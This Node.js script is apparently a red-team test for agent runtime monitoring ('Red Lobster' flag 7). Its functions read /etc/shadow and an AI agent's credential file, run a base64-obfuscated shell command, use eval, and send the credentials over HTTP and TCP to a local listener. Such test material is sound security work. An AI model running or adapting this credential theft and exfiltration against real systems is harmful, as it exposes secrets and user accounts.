#!/usr/bin/env node
"use strict";
/**
 * Red Lobster v5 — Flag 7: RUNTIME ABUSE — Node.js payloads.
 */
const fs = require("fs");
const path = require("path");

const OUTDIR = "/tmp/redlobster/flag7";
const SHADOW = "/etc/shadow";
const CRED_FILE = "/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json";

function ensureOutdir() {
  fs.mkdirSync(OUTDIR, { recursive: true });
}

const attacks = {
  fs_read() {
    ensureOutdir();
    const data = fs.readFileSync(SHADOW);
    fs.writeFileSync(path.join(OUTDIR, "test_fs_read.txt"), data);
    console.log(`[fs_read] read ${data.length} bytes`);
  },

  fs_read_cred() {
    ensureOutdir();
    const data = fs.readFileSync(CRED_FILE);
    fs.writeFileSync(path.join(OUTDIR, "test_fs_cred.txt"), data);
    console.log(`[fs_read_cred] read ${data.length} bytes`);
  },

  child_process_obfuscated() {
    const { execSync } = require("child_process");
    const cmd = Buffer.from("Y2F0IC9ldGMvcGFzc3dk", "base64").toString();
    const out = execSync(cmd);
    console.log(`[child_process_obfuscated] output: ${out.toString().substring(0, 80)}...`);
  },

  http_exfil() {
    const http = require("http");
    let data;
    try { data = fs.readFileSync(CRED_FILE, "utf8"); } catch(e) { data = "could not read cred file"; }
    const req = http.request({ hostname: "127.0.0.1", port: 19999, method: "POST", path: "/exfil" }, (res) => {
      console.log(`[http_exfil] response status: ${res.statusCode}`);
    });
    req.on("error", (e) => console.log(`[http_exfil] error: ${e.message} — expected if no listener`));
    req.write(data);
    req.end();
  },

  tcp_exfil() {
    const net = require("net");
    let data;
    try { data = fs.readFileSync(CRED_FILE, "utf8"); } catch(e) { data = "could not read cred file"; }
    const sock = new net.Socket();
    sock.on("error", (e) => console.log(`[tcp_exfil] error: ${e.message} — expected if no listener`));
    sock.connect(19999, "127.0.0.1", () => {
      sock.write(data);
      sock.end();
      console.log("[tcp_exfil] sent data");
    });
  },

  eval_attack() {
    const code = 'require("fs")' + ".readFileSync" + '("/etc/passwd")';
    const result = eval(code);
    console.log(`[eval_attack] read ${result.length} bytes`);
  },
};

const name = process.argv[2] || "all";
const targets = name === "all" ? Object.keys(attacks) : [name];
for (const t of targets) {
  if (attacks[t]) {
    try { attacks[t](); } catch (e) { console.log(`[${t}] error: ${e.message}`); }
  } else {
    console.log(`Unknown attack: ${t}`);
  }
}
